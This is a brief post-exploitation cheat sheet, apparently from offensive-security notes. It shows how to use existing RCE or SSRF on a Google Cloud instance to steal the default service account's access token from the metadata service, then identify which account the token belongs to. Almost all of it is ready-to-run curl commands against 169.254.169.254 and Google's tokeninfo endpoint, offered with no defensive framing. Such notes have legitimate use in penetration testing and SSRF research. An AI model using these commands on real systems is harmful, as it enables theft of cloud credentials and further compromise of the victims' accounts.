# Instance Metadata Service

## Prerequisites:

Achieve RCE or SSRF on a system, or similar.

### 1) Retrieve the access key for a Google service account form the instance metadata service

    curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

### 2) Identify which account the token belongs to

Google API

    curl https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=ACCESS_TOKEN

Instance Metadata

    curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

 
